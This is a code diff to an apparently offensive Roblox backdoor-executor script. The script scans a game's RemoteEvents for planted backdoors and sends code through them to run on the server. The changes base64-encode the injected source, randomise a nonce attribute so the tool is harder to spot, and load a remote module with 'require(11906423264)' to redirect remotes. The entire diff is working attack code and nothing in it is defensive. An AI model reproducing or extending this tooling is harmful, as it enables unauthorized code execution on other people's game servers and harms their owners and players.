@@ -126,12 +126,12 @@ local function pathToInstance(strPath)
 	local subPaths do
 		subPaths = table.create(0)
 
-		for matchedStr in string.gmatch(strPath, "[^%.]+") do
+		for matchedStr in string.gmatch(strPath, "[^%.]+") do -- handle ServerScriptService[\"Test 1\"][\"Test 2\"]
 			local subPath1 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%1")
 			local subPath2 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%2")
 
 			table.insert(subPaths, subPath1)
-			if subPath1 == subPath2 then continue end
+			if (subPath1 == subPath2 and matchedStr == subPath1) then continue end
 			table.insert(subPaths, subPath2)
 		end
 	end
@@ -253,7 +253,7 @@ local function applyRedirectedRemoteSecurity(source)
 	local nonceIndex = notSameRandNumber(1, 8, srcArgIndex, randIndex)
 
 	table.insert(generatedArgs, 10, true)
-	generatedArgs[srcArgIndex] = source
+	generatedArgs[srcArgIndex] = crypt.base64encode(source)
 	generatedArgs[randIndex] = srcArgIndex
 	generatedArgs[nonceIndex] = "~@" .. generateRandString(randIndex + 10)
 	for argIndex = 1, 9 do
@@ -324,22 +324,20 @@ local function initializeRemoteInfo(params, overwriteRemoteInfo)
 end
 
 local function initRemoteRedirection()
-	if not (config.redirectRemote and not remoteRedirectionInitialized) then return false end
-	local redirectedRemotePath = insertService:GetAttribute("bexeremotepath")
+	if not (remoteInfo.foundBackdoor and (config.redirectRemote and not remoteRedirectionInitialized)) then return false end
+	local nonce = generateRandString(32, true)
 
-	if not redirectedRemotePath then
-		execScript("require(11906423264)(%userid%)", true)
-		-- we need to improvise until :WaitForAttribute is added
-		waitUntil(5, function() return insertService:GetAttribute("bexeremotepath") end)
-		redirectedRemotePath = insertService:GetAttribute("bexeremotepath")
-	end
+	execScript(`require(11906423264)("{nonce}", %userid%)`, true)
+	-- we need to improvise until :WaitForAttribute is added
+	waitUntil(5, function() return insertService:GetAttribute(nonce) end)
+	local redirectedRemotePath = insertService:GetAttribute(nonce)
 
 	if not redirectedRemotePath then return warn(msgOutputs.failedRemoteRedirection) end
 	local redirectedRemote = pathToInstance(redirectedRemotePath)
 
 	if redirectedRemote and
 		redirectedRemote:IsA("RemoteEvent") and
-		redirectedRemote:GetAttribute("bexeremote")
+		redirectedRemote:GetAttribute("isNonced")
 	then
 		remoteRedirectionInitialized = true
 
@@ -349,14 +347,14 @@ local function initRemoteRedirection()
 			["argSrcIndex"] = 1
 		}, true)
 
-		insertService:GetAttributeChangedSignal("bexeremotepath"):Connect(function()
-			local newPath = insertService:GetAttribute("bexeremotepath")
+		insertService:GetAttributeChangedSignal(nonce):Connect(function()
+			local newPath = insertService:GetAttribute(nonce)
 			if not newPath then return end
 			local newRemote = pathToInstance(newPath)
 
 			if newRemote and
 				newRemote:IsA("RemoteEvent") and
-				newRemote:GetAttribute("bexeremote")
+				newRemote:GetAttribute("isNonced")
 			then
 				remoteInfo.instance = newRemote
 			end
@@ -494,20 +492,11 @@ do -- backdoor finding
 				warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
 			end
 		else
-			if insertService:GetAttribute("bexeremotepath") then -- checks if remote redirection is loaded
-				local remoteRedirectSuccess = initRemoteRedirection() -- hooks into the redirected remote
+			local startTime = os.clock()
 
-				if remoteRedirectSuccess then
-					onAttached(remoteInfo) -- loads the ui
-				end
-			end
-			if (not remoteRedirectionInitialized) then -- scanning remotes
-				local startTime = os.clock()
-
-				sendNotification("Press F9 to see the remotes being scanned.")
-				scanBackdoors()
-				warn(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
-			end
+			sendNotification("Press F9 to see the remotes being scanned.")
+			scanBackdoors()
+			warn(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
 		end
 
 		if not remoteInfo.foundBackdoor then -- if no backdoor found
